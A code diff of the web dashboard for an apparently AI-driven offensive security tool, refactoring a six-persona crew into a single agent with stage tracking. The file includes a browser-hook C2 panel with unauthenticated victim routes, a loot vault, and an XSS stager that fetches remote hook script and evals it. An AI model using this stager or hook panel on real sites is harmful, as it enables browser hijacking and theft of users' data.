@@ -1,13 +1,13 @@
-"""Live `#basement-ops` Web Command Center (`web/warroom_ui.py`).
+"""Live `#basement-ops` Web Command Center (`web/warroom_ui.py`) for the single `AGENT`.
 
 Features:
   - RFC 7617 HTTP Basic Authentication enabled by default (`admin:bugsBounty`), constant-time verified via `secrets.compare_digest`.
   - Victim hook routes (`/beef/*` and `/oob/*`) intentionally unauthenticated so hooked XSS victim browsers connect seamlessly without admin credentials, using strictly relative/same-origin paths (works locally AND over Arena HTTPS preview tunnels!).
   - 4 Full Real-Time Workspaces:
-      1. `#basement-ops` Group Chat & Crew Banter + Live Side Feed
-      2. Live Per-Agent Stats, `.bin/` Process Matrix & `PAYLOAD_MUTEX` WAF Board
+      1. `#basement-ops` Agent Console + Live Side Feed
+      2. Live Agent Stats & Stage Tracker, `.bin/` Process Matrix & `PAYLOAD_MUTEX` WAF Board
       3. Interactive BeEF Browser Exploitation C2 (10 Attack Modules, Custom JS Console, Live Hooked Victim Sandbox, Loot Vault & OOB Listener)
-      4. `RAZOR`-Verified Advisories, `curl`/Python PoCs, Binned False Positives, `CHAINSAW` Kill Chains & 22 `.bin/` Arsenal Table
+      4. Verified Advisories, `curl`/Python PoCs, Disproved Claims, Kill Chains & 22 `.bin/` Arsenal Table
 """
 import base64
 import errno
@@ -27,7 +27,7 @@ from core.llm import get_llm
 from tools.beef import DEMO_VICTIM_HTML, get_beef_server
 from tools.oob import get_oob_manager
 from tools.registry import ToolRegistry
-from agents.crew import CREW_BUS
+from agents.agent import AGENT_BUS
 from agents.warroom import WarRoomSession
 
 HTML_PAGE = r"""<!DOCTYPE html>
@@ -110,7 +110,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
 
   .workspace { display: none; flex: 1; min-height: 0; }
   .workspace.active { display: grid; }
-  #view-chat.active { grid-template-columns: 285px 1fr 390px; }
+  #view-chat.active { grid-template-columns: 300px 1fr 390px; }
   #view-ops.active { grid-template-rows: auto 1fr; grid-template-columns: 1fr; overflow-y: auto; display: flex; flex-direction: column; }
   #view-beef.active { grid-template-columns: 320px 1fr 410px; }
   #view-findings.active { grid-template-columns: 350px 1fr; }
@@ -124,14 +124,18 @@ HTML_PAGE = r"""<!DOCTYPE html>
   }
   .scroll { flex: 1; overflow-y: auto; padding: 11px; }
 
-  /* Crew Cards with Live Stats */
-  .crew-card {
+  /* Agent Cards with Live Stats */
+  .agent-card {
     padding: 9px 10px; border: 1px solid var(--border); border-radius: 7px; margin-bottom: 8px;
     background: var(--panel); cursor: pointer; transition: all .14s;
   }
-  .crew-card:hover { border-color: #365073; }
-  .crew-card.active { border-color: var(--cyan); background: #101e2e; }
-  .crew-card.running { border-color: var(--yellow); box-shadow: 0 0 14px rgba(255,209,102,.15); }
+  .agent-card:hover { border-color: #365073; }
+  .agent-card.active { border-color: var(--cyan); background: #101e2e; }
+  .agent-card.running { border-color: var(--yellow); box-shadow: 0 0 14px rgba(255,209,102,.15); }
+  .stage-line { display: flex; gap: 7px; align-items: center; font-size: 10.5px; padding: 3px 0; color: var(--muted); }
+  .stage-line.done { color: var(--green); }
+  .stage-line.running { color: var(--yellow); font-weight: 700; }
+  .stage-num { width: 15px; text-align: center; font-weight: 800; }
   .state-chip { font-size: 9.5px; padding: 1px 6px; border-radius: 4px; font-weight: 800; background: #1a2436; color: var(--muted); }
   .state-chip.RUNNING { background: #47350e; color: var(--yellow); }
   .state-chip.DONE { background: #103c2b; color: var(--green); }
@@ -150,12 +154,13 @@ HTML_PAGE = r"""<!DOCTYPE html>
     padding: 9px 11px; border-radius: 7px; background: var(--panel); border-left: 3px solid #2b3d57;
     margin-bottom: 8px; font-size: 12px; line-height: 1.48; word-break: break-word;
   }
-  .msg.cheer { border-left-color: var(--green); background: #0a2019; }
-  .msg.browneye { border-left-color: var(--red); background: #240f17; }
-  .msg.handoff { border-left-color: var(--magenta); background: #181126; }
-  .msg.audit { border-left-color: var(--yellow); background: #211b0c; }
+  .msg.stage { border-left-color: var(--cyan); background: #0c1b29; }
+  .msg.verified { border-left-color: var(--green); background: #0a2019; }
+  .msg.disproved { border-left-color: var(--red); background: #240f17; }
+  .msg.warn { border-left-color: var(--yellow); background: #211b0c; }
+  .msg.error { border-left-color: var(--red); background: #2a0f16; }
   .msg.waf { border-left-color: var(--orange); background: #24160c; }
-  .msg.operator { border-left-color: var(--cyan); background: #0e1d2c; }
+  .msg.operator { border-left-color: #7ee0ff; background: #0e1d2c; }
   .msg-head { display: flex; gap: 7px; align-items: center; margin-bottom: 4px; font-size: 10.5px; flex-wrap: wrap; }
   .badge { padding: 1px 6px; border-radius: 4px; font-size: 9px; font-weight: 800; text-transform: uppercase; background: #1c283b; color: var(--muted); }
   .quick-bar {
@@ -219,7 +224,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
     <input id="targetInput" placeholder="https://authorized-target.tld  (or Launch Lab ->)" />
     <button onclick="setTarget()">Target</button>
     <button class="success" onclick="sendCmd('/lab', '', true)">Launch Lab</button>
-    <button class="danger" onclick="sendCmd('/autopilot', '', true)">⚡ 6-Agent Autopilot</button>
+    <button class="danger" onclick="sendCmd('/autopilot', '', true)">⚡ Run Autopilot</button>
     <button class="primary" onclick="toggleKeyBar()">🔑 API Key</button>
   </div>
 </header>
@@ -240,7 +245,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
 
 <nav class="nav-views">
   <div class="view-tabs">
-    <button id="tab-chat" class="active" onclick="switchView('chat')">💬 #basement-ops Group Chat &amp; War-Room</button>
+    <button id="tab-chat" class="active" onclick="switchView('chat')">💬 #basement-ops Agent Console</button>
     <button id="tab-ops" onclick="switchView('ops')">📡 Live Agent Stats &amp; .bin Activity <span class="badge-cnt" id="navActiveCnt">0 active</span></button>
     <button id="tab-beef" onclick="switchView('beef')">🐂 BeEF Hook C2 &amp; OOB Panel <span class="badge-cnt green" id="navBeefCnt">0 hooked</span></button>
     <button id="tab-findings" onclick="switchView('findings')">🏆 Advisories, PoCs, Chains &amp; 22 Tools <span class="badge-cnt green" id="navVerCnt">0</span></button>
@@ -248,45 +253,31 @@ HTML_PAGE = r"""<!DOCTYPE html>
   <div style="font-size:10.5px;color:var(--muted)">LLM: <b id="llmBadge" style="color:var(--cyan)">...</b></div>
 </nav>
 
-<!-- ==================== WORKSPACE 1: GROUP CHAT & WAR-ROOM ==================== -->
+<!-- ==================== WORKSPACE 1: AGENT CONSOLE ==================== -->
 <div class="workspace active" id="view-chat">
   <div class="col">
-    <div class="pane-head"><span>6-Agent Crew &amp; Live Telemetry</span><span>Click to @Tag</span></div>
-    <div class="scroll" id="crewList"></div>
-    <div class="actions-grid">
-      <button onclick="sendCmd('/recon', '', true)">1. GHOST Recon</button>
-      <button onclick="sendCmd('/hunt', '', true)">2. BLITZ Hunt</button>
-      <button onclick="sendCmd('/escalate', '', true)">3. SWITCH Escalate</button>
-      <button onclick="sendCmd('/critic', '', true)">4. RAZOR Critic</button>
-      <button onclick="sendCmd('/chains', '', true)">5. CHAINSAW</button>
-      <button onclick="sendCmd('/report', '', true)">6. FIXER Report</button>
-    </div>
+    <div class="pane-head"><span>Agent &amp; Live Telemetry</span><span id="agentStateChip" class="state-chip">IDLE</span></div>
+    <div class="scroll" id="agentPanel"></div>
+    <div class="pane-head" style="border-top:1px solid var(--border)"><span>Pipeline Stages</span><span id="stageProgress">0/6</span></div>
+    <div class="actions-grid" id="stageGrid"></div>
   </div>
 
   <div class="col">
     <div class="pane-head">
-      <span>#basement-ops Group Chat — Banter, Handoffs, Cheers &amp; RAZOR Brown-Eyes</span>
+      <span>#basement-ops — talk to the agent, watch every stage as it runs</span>
       <span id="chatTyping" style="color:var(--yellow)"></span>
     </div>
     <div class="scroll" id="chatFeed"></div>
     <div class="quick-bar">
-      <button onclick="sendCmd('Oi crew! Sound off with station status and roast whoever is slacking!', '', true)">🍻 Crew Roll-Call &amp; Banter</button>
-      <button onclick="sendCmd('RAZOR who copped the worst brown-eye today and why?', '', true)">🍑 Brown-Eye Report</button>
-      <button onclick="sendCmd('What is our WAF & tamper strategy on this target boys?', '', true)">🛡️ WAF Strategy</button>
-      <button onclick="openVictimAndSwitch()">🪝 Hook Demo Victim Browser</button>
+      <button onclick="sendCmd('/autopilot', '', true)">⚡ Run Autopilot</button>
       <button onclick="sendCmd('/status', '', true)">📊 Status Summary</button>
+      <button onclick="sendCmd('What is the WAF and tamper strategy for this target?', '', true)">🛡️ WAF Strategy</button>
+      <button onclick="openVictimAndSwitch()">🪝 Hook Demo Victim Browser</button>
+      <button onclick="sendCmd('What should we do next on this target?', '', true)">🧭 What Next?</button>
     </div>
     <form class="composer" onsubmit="onSubmitChat(event)">
-      <select id="speakerSelect">
-        <option value="">@CREW (Group Banter)</option>
-        <option value="GHOST">@GHOST (Recon)</option>
-        <option value="BLITZ">@BLITZ (Hunter)</option>
-        <option value="SWITCH">@SWITCH (Escalator)</option>
-        <option value="RAZOR">@RAZOR (Critic)</option>
-        <option value="CHAINSAW">@CHAINSAW (Chains)</option>
-        <option value="FIXER">@FIXER (Reporter)</option>
-      </select>
-      <input id="chatInput" placeholder="Banter with the whole crew, @mention an operator, drop a URL, or run /autopilot..." autocomplete="off" />
+      <span class="tag" style="padding:7px 10px;font-weight:800;color:var(--cyan)">@AGENT</span>
+      <input id="chatInput" placeholder="Ask the agent, drop a target URL, or run /autopilot..." autocomplete="off" />
       <button class="primary" type="submit">Send</button>
     </form>
   </div>
@@ -295,7 +286,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
     <div class="tabs">
       <button id="rtab-wire" class="active" onclick="setRightTab('wire')">⚡ Live Feed</button>
       <button id="rtab-ver" onclick="setRightTab('ver')">✅ Bugs (<span id="cntV">0</span>)</button>
-      <button id="rtab-dis" onclick="setRightTab('dis')">🍑 Binned (<span id="cntD">0</span>)</button>
+      <button id="rtab-dis" onclick="setRightTab('dis')">🚫 Disproved (<span id="cntD">0</span>)</button>
       <button id="rtab-chn" onclick="setRightTab('chn')">⛓️ Chains (<span id="cntC">0</span>)</button>
     </div>
     <div class="scroll" id="rightPane"></div>
@@ -323,7 +314,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
         <button onclick="setWireFilter('process')" id="wf-process" style="padding:3px 8px;font-size:10px">.BIN PROC</button>
         <button onclick="setWireFilter('http')" id="wf-http" style="padding:3px 8px;font-size:10px">HTTP WIRE</button>
         <button onclick="setWireFilter('waf')" id="wf-waf" style="padding:3px 8px;font-size:10px">WAF MUTEX</button>
-        <button onclick="setWireFilter('critic')" id="wf-critic" style="padding:3px 8px;font-size:10px">RAZOR</button>
+        <button onclick="setWireFilter('critic')" id="wf-critic" style="padding:3px 8px;font-size:10px">VERIFY</button>
         <button onclick="setWireFilter('c2')" id="wf-c2" style="padding:3px 8px;font-size:10px">BeEF / OOB</button>
       </div>
     </div>
@@ -410,8 +401,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
 
 <script>
 const COLORS = {
-  GHOST: '#28d7ff', BLITZ: '#ff4769', SWITCH: '#c77dff',
-  RAZOR: '#ffd166', CHAINSAW: '#2be89a', FIXER: '#5fa8ff', YOU: '#ffffff'
+  AGENT: '#28d7ff', SYSTEM: '#8496b0', YOU: '#ffffff'
 };
 
 let state = null;
@@ -465,13 +455,6 @@ function setWireFilter(f) {
   if (state) renderOps();
 }
 
-function selectCrew(handle) {
-  const sel = document.getElementById('speakerSelect');
-  sel.value = (sel.value === handle ? '' : handle);
-  document.getElementById('chatInput').focus();
-  renderCrew();
-}
-
 function openVictimAndSwitch() {
   switchView('beef');
   spawnDemoVictim();
@@ -515,27 +498,48 @@ function copySvgStager() {
   navigator.clipboard?.writeText(`"><svg/onload="fetch('${publicHookUrl()}').then(r=>r.text()).then(eval)">`);
 }
 
-function renderCrew() {
-  const cur = document.getElementById('speakerSelect').value;
-  document.getElementById('crewList').innerHTML = (state.crew || []).map(c => {
-    const s = c.stats || {};
-    const st = s.state || 'IDLE';
-    return `
-      <div class="crew-card ${cur === c.handle ? 'active' : ''} ${st === 'RUNNING' ? 'running' : ''}" onclick="selectCrew('${c.handle}')">
-        <div style="display:flex;justify-content:space-between;align-items:center">
-          <span style="color:${COLORS[c.handle] || '#fff'};font-weight:800;font-size:12.5px">@${c.handle}</span>
-          <span class="state-chip ${st}">${esc(s.current_tool || st)}</span>
-        </div>
-        <div style="color:var(--muted);font-size:10px;margin-top:2px">${esc(c.role)}</div>
-        <div class="task-line" title="${esc(s.current_task || '')}">${esc(s.current_task || 'Standing by')}</div>
-        <div class="mini-stats">
-          <div>HTTP<b>${s.http_requests || 0}</b></div>
-          <div>.bin<b>${s.bin_runs || 0}</b></div>
-          <div>WAF<b>${s.waf_bypasses || 0}/${s.waf_blocks || 0}</b></div>
-          <div>Win/Bin<b>${(s.verified_wins || s.leads_found || s.escalations || 0)}/${s.browneyes || 0}</b></div>
-        </div>
-      </div>`;
-  }).join('');
+function renderAgent() {
+  const a = state.agent || {};
+  const s = a.stats || {};
+  const stages = state.stages || [];
+  const st = s.state || 'IDLE';
+  const doneCount = stages.filter(x => x.state === 'done').length;
+
+  const chip = document.getElementById('agentStateChip');
+  chip.textContent = s.current_tool ? `${st} · ${s.current_tool}` : st;
+  chip.className = 'state-chip ' + st;
+  document.getElementById('stageProgress').textContent = `${doneCount}/${stages.length || 6}`;
+
+  const stageLines = stages.map(x => `
+    <div class="stage-line ${esc(x.state)}">
+      <span class="stage-num">${x.state === 'done' ? '✓' : (x.state === 'running' ? '▸' : x.index)}</span>
+      <span>${esc(x.label)}</span>
+      <span style="margin-left:auto;font-size:9.5px">${esc(x.state === 'done' ? 'done' : (x.state === 'running' ? 'running' : 'pending'))}</span>
+    </div>`).join('');
+
+  document.getElementById('agentPanel').innerHTML = `
+    <div class="agent-card ${st === 'RUNNING' ? 'running' : ''}">
+      <div style="display:flex;justify-content:space-between;align-items:center">
+        <span style="color:${COLORS[a.handle] || 'var(--cyan)'};font-weight:800;font-size:13px">@${esc(a.handle || 'AGENT')}</span>
+        <span class="state-chip ${st}">${esc(st)}</span>
+      </div>
+      <div style="color:var(--muted);font-size:10px;margin-top:2px">${esc(a.role || 'Offensive Security Agent')}</div>
+      <div class="task-line" title="${esc(s.current_task || '')}">${esc(s.current_task || 'Standing by')}</div>
+      <div class="mini-stats">
+        <div>HTTP<b>${s.http_requests || 0}</b></div>
+        <div>.bin<b>${s.bin_runs || 0}</b></div>
+        <div>WAF<b>${s.waf_bypasses || 0}/${s.waf_blocks || 0}</b></div>
+        <div>Ver/Bin<b>${s.verified_wins || 0}/${s.disproved || 0}</b></div>
+      </div>
+    </div>
+    <div style="font-size:10px;color:var(--muted);margin:10px 0 4px;text-transform:uppercase;letter-spacing:.9px">Stage progress</div>
+    ${stageLines || '<div style="color:var(--muted);font-size:11px">Waiting for state…</div>'}`;
+
+  document.getElementById('stageGrid').innerHTML = stages.map(x => `
+    <button onclick="sendCmd('/${esc(x.key)}', '', true)" title="${esc(x.task)}"
+      style="${x.state === 'done' ? 'border-color:var(--green);color:var(--green)' : (x.state === 'running' ? 'border-color:var(--yellow);color:var(--yellow)' : '')}">
+      ${x.index}. ${esc(x.label)}
+    </button>`).join('');
 }
 
 function renderChat() {
@@ -553,7 +557,7 @@ function renderChat() {
         <div class="msg-head">
           <strong style="color:${col}">${esc(m.speaker)}</strong>
           ${arrow}
-          <span class="badge">${esc(m.kind || 'crew')}</span>
+          <span class="badge">${esc(m.kind || 'agent')}</span>
           <span style="margin-left:auto;color:var(--muted);font-size:9.5px">${new Date((m.ts || 0)*1000).toLocaleTimeString()}</span>
         </div>
         <div>${esc(m.text)}</div>
@@ -573,7 +577,7 @@ function renderRight() {
           <div><strong style="color:${COLORS[e.agent] || 'var(--cyan)'}">${esc(e.agent)}</strong> ${esc(e.title)}</div>
           ${e.detail ? `<div style="color:var(--muted);font-size:9.8px;overflow:hidden;text-overflow:ellipsis">${esc(e.detail)}</div>` : ''}
         </div>
-      </div>`).join('') : '<p style="color:var(--muted);font-size:12px">No wire activity yet — click Launch Lab or 6-Agent Autopilot!</p>';
+      </div>`).join('') : '<p style="color:var(--muted);font-size:12px">No wire activity yet — click Launch Lab or Run Autopilot!</p>';
   } else if (rightTab === 'ver') {
     pane.innerHTML = (state.verified || []).length ? state.verified.map(f => `
       <div class="finding ${esc(f.severity)}">
@@ -584,14 +588,14 @@ function renderRight() {
         <div style="color:var(--cyan);margin-top:3px;word-break:break-all">${esc(f.url)}</div>
         <div style="color:var(--muted);font-size:10.5px;margin-top:4px">${esc(f.evidence)}</div>
         ${f.curl_poc ? `<pre class="code">${esc(f.curl_poc)}</pre>` : ''}
-      </div>`).join('') : '<p style="color:var(--muted);font-size:12px">No RAZOR-certified bugs yet.</p>';
+      </div>`).join('') : '<p style="color:var(--muted);font-size:12px">No verified findings yet.</p>';
   } else if (rightTab === 'dis') {
     pane.innerHTML = (state.disproved || []).length ? state.disproved.map(f => `
       <div class="finding disproved">
-        <strong style="color:var(--red)">🍑 BINNED BY RAZOR :: ${esc(f.type)}</strong>
+        <strong style="color:var(--red)">🍑 DISPROVED :: ${esc(f.type)}</strong>
         <div style="color:var(--muted);margin-top:3px;word-break:break-all">${esc(f.url)}</div>
         <div style="color:#ffb3c1;font-size:10.5px;margin-top:4px">${esc((f.critic_notes || []).join(' | '))}</div>
-      </div>`).join('') : '<p style="color:var(--muted);font-size:12px">No false-positive mirages binned yet.</p>';
+      </div>`).join('') : '<p style="color:var(--muted);font-size:12px">No false-positive claims disproved yet.</p>';
   } else {
     pane.innerHTML = (state.chains || []).length ? state.chains.map(c => `
       <div class="finding critical">
@@ -605,24 +609,30 @@ function renderRight() {
 function renderOps() {
   if (activeView !== 'ops') return;
   const t = state.telemetry || {};
-  document.getElementById('opsAgentGrid').innerHTML = (state.crew || []).map(c => {
-    const s = c.stats || {};
-    return `
-      <div class="ops-card" style="border-top:3px solid ${COLORS[c.handle] || '#fff'}">
-        <div style="display:flex;justify-content:space-between;align-items:center">
-          <strong style="color:${COLORS[c.handle]};font-size:14px">${c.handle} — ${esc(c.role)}</strong>
-          <span class="state-chip ${s.state || 'IDLE'}">${esc(s.state || 'IDLE')}</span>
+  const a = state.agent || {};
+  const as = a.stats || {};
+  const stage = (state.status && state.status.current_stage) || as.current_stage || '';
+  const stageLabel = (state.stages || []).find(x => x.key === stage);
+  document.getElementById('opsAgentGrid').innerHTML = `
+      <div class="ops-card" style="border-top:3px solid ${COLORS[a.handle] || '#fff'};grid-column:1 / -1">
+        <div style="display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap">
+          <strong style="color:${COLORS[a.handle]};font-size:14px">${esc(a.handle || 'AGENT')} — ${esc(a.role || 'Offensive Security Agent')}</strong>
+          <div style="display:flex;gap:6px;align-items:center">
+            ${stageLabel ? `<span class="state-chip RUNNING">stage ${stageLabel.index}/${(state.stages || []).length}: ${esc(stageLabel.label)}</span>` : ''}
+            <span class="state-chip ${as.state || 'IDLE'}">${esc(as.state || 'IDLE')}</span>
+          </div>
         </div>
-        <div style="margin-top:7px;font-size:11.5px;color:#bde0fe">Task: <b>${esc(s.current_task || 'Idle')}</b></div>
-        <div style="margin-top:3px;font-size:11px;color:var(--yellow)">Active Tool: <code>${esc(s.current_tool || 'none')}</code></div>
+        <div style="margin-top:7px;font-size:11.5px;color:#bde0fe">Task: <b>${esc(as.current_task || 'Idle')}</b></div>
+        <div style="margin-top:3px;font-size:11px;color:var(--yellow)">Active Tool: <code>${esc(as.current_tool || 'none')}</code></div>
         <div class="mini-stats" style="margin-top:9px">
-          <div>HTTP Reqs<b>${s.http_requests || 0}</b></div>
-          <div>.bin Runs<b>${s.bin_runs || 0}</b></div>
-          <div>WAF Wins<b>${s.waf_bypasses || 0}</b></div>
-          <div>Runtime<b>${Math.round(s.total_runtime_ms || 0)}ms</b></div>
+          <div>HTTP Reqs<b>${as.http_requests || 0}</b></div>
+          <div>.bin Runs<b>${as.bin_runs || 0}</b></div>
+          <div>WAF Wins<b>${as.waf_bypasses || 0}</b></div>
+          <div>Verified<b>${as.verified_wins || 0}</b></div>
+          <div>Disproved<b>${as.disproved || 0}</b></div>
+          <div>Runtime<b>${Math.round(as.total_runtime_ms || 0)}ms</b></div>
         </div>
       </div>`;
-  }).join('');
 
   const act = t.active_processes || [];
   const rec = t.recent_processes || [];
@@ -654,12 +664,12 @@ function renderBeef() {
 
   const list = b.sessions_list || [];
   document.getElementById('beefSessions').innerHTML = `
-    <div class="crew-card ${selectedSid === '*' ? 'active' : ''}" onclick="selectedSid='*';renderBeef()">
+    <div class="agent-card ${selectedSid === '*' ? 'active' : ''}" onclick="selectedSid='*';renderBeef()">
       <strong style="color:var(--cyan)">📡 Broadcast (* All Hooked Browsers — ${list.length})</strong>
     </div>` + (list.length ? list.map(s => {
       const tel = s.telemetry || {};
       return `
-      <div class="crew-card ${selectedSid === s.sid ? 'active' : ''}" onclick="selectedSid='${esc(s.sid)}';renderBeef()">
+      <div class="agent-card ${selectedSid === s.sid ? 'active' : ''}" onclick="selectedSid='${esc(s.sid)}';renderBeef()">
         <div style="display:flex;justify-content:space-between">
           <strong style="color:${s.online ? 'var(--green)' : 'var(--yellow)'}">${s.online ? '🟢' : '🟡'} ${esc(s.sid)}</strong>
           <span style="font-size:10px;color:var(--muted)">${s.age_sec}s ago</span>
@@ -728,10 +738,10 @@ function renderFindingsView() {
       </div>`),
     ...(state.disproved || []).map(f => `
       <div class="finding disproved">
-        <strong style="color:var(--red)">🍑 BINNED FALSE POSITIVE :: ${esc(f.type)} @ ${esc(f.url)}</strong>
+        <strong style="color:var(--red)">🍑 DISPROVED FALSE POSITIVE :: ${esc(f.type)} @ ${esc(f.url)}</strong>
         <div style="color:#ffb3c1;margin-top:4px">${esc((f.critic_notes||[]).join(' | '))}</div>
       </div>`)
-  ].join('') || '<p style="color:var(--muted)">Run <b>⚡ 6-Agent Autopilot</b> to populate verified advisories, curl PoCs, and RAZOR brown-eye disproofs.</p>';
+  ].join('') || '<p style="color:var(--muted)">Run <b>⚡ Run Autopilot</b> to populate verified advisories, curl PoCs, and disproved false positives.</p>';
 }
 
 function render() {
@@ -760,7 +770,7 @@ function render() {
   if (st.running_job) {
     jp.classList.add('live');
     document.getElementById('jobText').textContent = `${st.running_job.command} (${st.running_job.elapsed_s || 0}s)`;
-    document.getElementById('chatTyping').textContent = `⚡ Crew executing: ${st.running_job.command}...`;
+    document.getElementById('chatTyping').textContent = `⚡ Agent executing: ${st.running_job.command}...`;
   } else {
     jp.classList.remove('live');
     document.getElementById('chatTyping').textContent = '';
@@ -770,7 +780,7 @@ function render() {
   const ks = document.getElementById('keyStatus');
   if (ks && st.llm) ks.textContent = `Active: ${st.llm.active_provider} (${st.llm.active_model}) | Endpoint: ${st.llm.base_url} | Key: ${st.llm.api_key_masked}`;
 
-  renderCrew();
+  renderAgent();
   renderChat();
   renderRight();
   renderOps();
@@ -850,17 +860,16 @@ async function setTarget() {
 async function onSubmitChat(ev) {
   ev.preventDefault();
   const inp = document.getElementById('chatInput');
-  const speaker = document.getElementById('speakerSelect').value;
   const msg = inp.value.trim();
   if (!msg) return;
   inp.value = '';
-  await sendCmd(msg, speaker, true);
+  await sendCmd(msg, '', true);
 }
 
 api('api/tools').then(d => { toolsCache = d.tools || []; if (state) renderFindingsView(); }).catch(() => {});
 refreshState().then(() => {
   if (state && (!state.transcript || !state.transcript.length)) {
-    sendCmd('Oi crew! Sound off with station status in #basement-ops!', '', true);
+    sendCmd('/status', '', true);
   }
   scheduleNextPoll();
 });
@@ -923,7 +932,7 @@ def start_warroom_server(
     auth_pass: str | None = None,
     require_auth: bool = True,
 ):
-    CFG["crew_banter"] = True
+    CFG["agent_streaming"] = True
     ui_user = auth_user if auth_user is not None else os.environ.get("BUGHUNTER_UI_USER", "admin")
     ui_pass = auth_pass if auth_pass is not None else os.environ.get("BUGHUNTER_UI_PASS", "bugsBounty")
 
@@ -1123,10 +1132,9 @@ def start_warroom_server(
                     persist=True,
                 )
                 st_llm = get_llm().status_summary()
-                CREW_BUS.say(
-                    "GHOST",
-                    f"Updated live LLM config -> provider=`{st_llm['active_provider']}` | model=`{st_llm['active_model']}` | key=`{st_llm['api_key_masked']}`!",
-                    kind="cheer",
+                AGENT_BUS.say(
+                    f"Updated live LLM config -> provider=`{st_llm['active_provider']}` | model=`{st_llm['active_model']}` | key=`{st_llm['api_key_masked']}`.",
+                    kind="info",
                 )
                 self._json(200, {"ok": True, "info": info, "llm": st_llm})
                 return
